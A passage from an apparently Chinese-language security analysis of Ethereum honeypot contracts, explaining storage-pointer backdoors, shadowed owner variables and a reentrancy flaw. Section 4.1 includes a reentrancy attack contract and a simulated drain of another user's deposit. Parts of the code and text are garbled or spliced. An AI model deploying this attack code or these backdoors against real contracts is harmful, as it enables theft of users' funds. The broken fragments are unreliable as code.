            }
    }
如图所示，攻击者 `0x583031d1113ad414f02576bd6afabfb302140225` 在调用 `fake_foo()` 之后，成功将
`owner` 修改成自己。
在 `2.3节` 中，介绍了 `Solidity` 的继承原理是代码拷贝。也就是最终都能写成一个单独的合约。这也就意味着，该 `bug`
也会影响到被继承的父类变量，`示例代码2`如下：
    pragma solidity ^0.4.0;
    contract Owner {
        address public owner;
        modifier onlyOwner {
            require(owner == msg.sender);
            _;
        }
    }
    contract Test is Owner {
        struct Seed {
            address x;
        }
        function Test() {
            owner = msg.sender;
        }
        function fake_foo() public {
            Seed s;
            s.x = msg.sender;
        }
    }
相比于`示例代码1`，`示例代码2` 更容易出现在现实生活中。由于 `示例代码2` 配合复杂的逻辑隐蔽性较高，更容易被不良合约发布者利用。比如利用这种特性留
`后门`。
在[参考链接10](https://github.com/ethereum/solidity/issues/1789)中，开发者认为由于某些原因，让编译器通过警告的方式通知用户更合适。所以在目前
`0.4.x` 版本中，编译器会通过警告的方式通知智能合约开发者；但这种存在安全隐患的代码是可以通过编译并部署的。
**`solidity` 开发者将在 `0.5.0` 版本将该类问题归于错误处理。**
#### 3.3 山丘之王：KingOfTheHill
  * Github地址：[Solidlity-Vulnerable/honeypots/KingOfTheHill.sol](https://github.com/misterch0c/Solidlity-Vulnerable/blob/master/honeypots/KingOfTheHill.sol)
  * 智能合约地址：[0x4dc76cfc65b14b3fd83c8bc8b895482f3cbc150a](https://etherscan.io/address/0x4dc76cfc65b14b3fd83c8bc8b895482f3cbc150a#code)
  * 合约关键代码如下：
     contract Owned {
         address owner;    
             function Owned() {
             owner = msg.sender;
         }
         modifier onlyOwner{
             if (msg.sender != owner)
                 revert();
                     _;
         }
     }
     contract KingOfTheHill is Owned {
         address public owner;
         function() public payable {
             if (msg.value > jackpot) {
                 owner = msg.sender;
                 withdrawDelay = block.timestamp + 5 days;
             }
             jackpot+=msg.value;
         }
         function takeAll() public onlyOwner {
             require(block.timestamp >= withdrawDelay);
             msg.sender.transfer(this.balance);
             jackpot=0;
         }
     }
这个合约的逻辑是：每次请求 `fallback()`，变量 `jackopt` 就是加上本次传入的金额。如果你传入的金额大于之前的 `jackopt`，那么
`owner` 就会变成你的地址。
看到这个代码逻辑，你是否感觉和 `2.2节` 、 `2.3节` 有一定类似呢？
让我们先看第一个问题：`msg.value > jackopt`是否可以成立？答案是肯定的，由于 `jackopt+=msg.value` 在
`msg.value > jackopt` 判断之后，所以不会出现 `2.2节` 合约永远比你钱多的情况。
然而这个合约存在与 `2.3节` 同样的问题。在 `msg.value > jackopt` 的情况下，`KingOfTheHill` 中的 `owner`
被修改为发送者的地址，但 `Owned` 中的 `owner` 依旧是合约创建人的地址。这也就意味着取钱函数 `takeAll()`
将永远只有庄家才能调用，所有的账户余额都将会进入庄家的口袋。
与之类似的智能合约还有 `RichestTakeAll`：
  * Github地址：[Solidlity-Vulnerable/honeypots/RichestTakeAll.sol](https://github.com/misterch0c/Solidlity-Vulnerable/blob/master/honeypots/RichestTakeAll.sol)
  * 智能合约地址：[0xe65c53087e1a40b7c53b9a0ea3c2562ae2dfeb24](https://etherscan.io/address/0xe65c53087e1a40b7c53b9a0ea3c2562ae2dfeb24#code)
#### 3.4 以太币竞争游戏：RACEFORETH
  * Github地址：[Solidlity-Vulnerable/honeypots/RACEFORETH.sol](https://github.com/misterch0c/Solidlity-Vulnerable/blob/master/honeypots/RACEFORETH.sol)
  * 合约关键代码如下：
     contract RACEFORETH {
        uint256 public SCORE_TO_WIN = 100 finney;
        uint256 public speed_limit = 50 finney;
        function race() public payable {
            if (racerSpeedLimit[msg.sender] == 0) { racerSpeedLimit[msg.sender] = speed_limit; }
            require(msg.value  1 wei);
            racerScore[msg.sender] += msg.value;
            racerSpeedLimit[msg.sender] = (racerSpeedLimit[msg.sender] / 2);
            latestTimestamp = now;
            // YOU WON
            if (racerScore[msg.sender] >= SCORE_TO_WIN) {
                msg.sender.transfer(PRIZE);
            }
        }
        function () public payable {
            race();
        }
     }
这个智能合约有趣的地方在于它设置了最大转账上限是 `50 finney`，最小转账下限是 `2 wei`(条件是大于 `1 wei`，也就是最小 `2
wei`)。每次转账之后，最大转账上限都会缩小成原来的一半，当总转账数量大于等于 `100 finney`，那就可以取出庄家在初始化智能合约时放进的钱。
假设我们转账了 `x` 次，那我们最多可以转的金额如下：
     50 + 50 * (1/2)^1 + 50 * (1/2)^2 + 50 * (1/2)^3  ...... 50 * (1/2)^x
根据高中的知识可以知道，该数字将会永远小于 `100`
     50 * (1/2)^0 + 50 * (1/2)^1 + 50 * (1/2)^2 + 50 * (1/2)^3 ......  利用重入漏洞的The DAO事件直接导致了以太坊的硬分叉、利用整数溢出漏洞可能导致代币交易出现问题。  
>  [DASP TOP10](https://www.dasp.co/) 中的前三：
> 重入漏洞、访问控制、算数问题在这些蜜罐智能合约中均有体现。黑客在这场欺诈者的游戏中扮演着不可或缺的角色。
#### 4.1 私人银行(重入漏洞)：PrivateBank
  * Github地址：[smart-contract-honeypots/PrivateBank.sol](https://github.com/thec00n/smart-contract-honeypots/blob/master/PrivateBank.sol) [Solidlity-Vulnerable/honeypots/PRIVATE_BANK.sol](https://github.com/misterch0c/Solidlity-Vulnerable/blob/master/honeypots/PRIVATE_BANK.sol)
  * 智能合约地址：[0x95d34980095380851902ccd9a1fb4c813c2cb639](https://etherscan.io/address/0x95d34980095380851902ccd9a1fb4c813c2cb639#code)
  * 合约关键代码如下：
     function CashOut(uint _am)
    {
            if(_am= amount) {
                victim.call.value(amount)(bytes4(keccak256("Deposit()")));
            }
        }
        function step2(uint256 amount)  {
            victim.call(bytes4(keccak256("CashOut(uint256)")), amount);
        }
        // selfdestruct, send all balance to owner
        function stopAttack()  {
            selfdestruct(owner);
        }
        function startAttack(uint256 amount)  {
            step1(amount);
            step2(amount / 2);
        }
        function () payable {
            victim.call(bytes4(keccak256("CashOut(uint256)")), msg.value);
        }
    }
模拟的攻击步骤如下：
1.正常用户`A`（地址：`0x14723a09acff6d2a60dcdf7aa4aff308fddc160c`）向该合约存入 `50 ether`。
2.恶意攻击者
`B`(地址：`0x583031d1113ad414f02576bd6afabfb302140225`)新建恶意智能合约Attack，实施攻击。不仅取出了自己存入的
`10 ether`，还取出了 `A` 存入的 `50 ether`。用户 `A` 的余额还是`50 ether`，而恶意攻击者 `B`
的余额也因为发生溢出变成
`115792089237316195423570985008687907853269984665640564039407584007913129639936`。
**虽然此时用户A的余额仍然存在，但由于合约中已经没有以太币了，所以A将无法取出其存入的50个以太币**
根据以上的案例可以得出如下结论：当普通用户将以太币存取该蜜罐智能合约地址，他的代币将会被恶意攻击者通过重入攻击取出，虽然他依旧能查到在该智能合约中存入的代币数量，但将无法取出相应的代币。
#### 4.2 偷梁换柱的地址(访问控制)：firstTest